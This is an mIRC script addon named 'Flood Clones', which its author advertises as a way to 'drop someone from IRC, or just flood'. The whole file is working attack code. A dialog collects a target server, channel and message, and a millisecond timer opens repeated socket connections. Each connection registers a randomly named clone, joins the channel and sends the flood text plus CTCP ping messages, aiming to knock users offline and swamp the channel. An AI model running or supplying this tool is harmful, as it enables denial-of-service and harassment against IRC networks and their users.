;Flood Clones v2.0 by ShakE
;Drop someone from IRC, or just flood!
;All Copyrights reserved!
;For more addons visit http://xsoft.hit.bg
;For questions and bugs mailto: shake@haho.org

on *:load:{
 /echo -a Flood Clones by ShakE
 /echo -a Usage: /floodclones
 /echo -a More addons from http://xsoft.hit.bg
}

on 1:sockopen:flood*: {
  sockwrite -tn $sockname user clone $+ $rand(1,10000) qwer qwre qwre  
  sockwrite -tn $sockname nick %clonenick $+ $rand(1,10000) 
  sockwrite -tn $sockname join %clonechan
  sockwrite -tn $sockname privmsg %clonechan : $+ %clonetext
  sockwrite -nt $sockname privmsg %clonechan : $+ $chr(1) $+ ping $+ $chr(1)
  did -a clones 3 $crlf $+ $sockname Is In!
  sockclose $sockname
  inc %clonenum 1
}
alias done {
  sockopen flood $+ $rand(1,1000) $+ $rand(A,Z) %cloneserver 6667 
}
dialog clones {
  Title FLOOD CLONES!
  size -1 -1 230 150
  button "",100,1 1 1 1,ok,hide  
  button "Halt",1,170 90 50 20
  button "Start",2,115 90 50 20
  edit "Flood clones",3, 10 10 100 100,read,center,autovs,multi
  edit "Server",4, 115 10 105 20,autohs,center
  edit "Nick/Channel",5,115 35 105 20,autohs,center
  edit "Clone's nick",6,115 60 105 20,autohs,center
  box "",7,1 -5 228 155
  edit "Flood Message (make it large)",8,10 120 170 20,autohs,center,limit 300
  edit "0",9,185 120 35 20,center,read
}
on *:dialog:clones:init:*: {
  did -b $dname 1  
  if %clonenick != $null { did -o clones 6 1 %clonenick }
  if %cloneserver != $null { did -o clones 4 1 %cloneserver } 
  if %clonechan != $null { did -o clones 5 1 %clonechan }
  if %clonetext != $null { did -o clones 8 1 %clonetext }
  did -o clones 9 1 $did(clones,8,1).len
}
on *:dialog:clones:sclick:*: {
  if $did == 2 { %clonenick = $did(6) | %clonechan = $did(5) | %cloneserver = $did(4) | %clonetext = $did(8) | did -o clones 3 1 Connecting... | did -b clones 2 | did -e clones 1 | .timerclone -m 0 1 done }
  if $did == 1 { sockclose flood* | .timerclone off | did -r clones 3 | did -a clones 3 Result : %clonenum Clones! | unset %clonenum | did -e clones 2 | did -b clones 1 }
}
on *:dialog:clones:edit:8: {
  did -o clones 9 1 $did(clones,8,1).len
}
alias floodclones /dialog -ma clones clones
menu menubar,channel {
 Flood-Clones:/floodclones
} 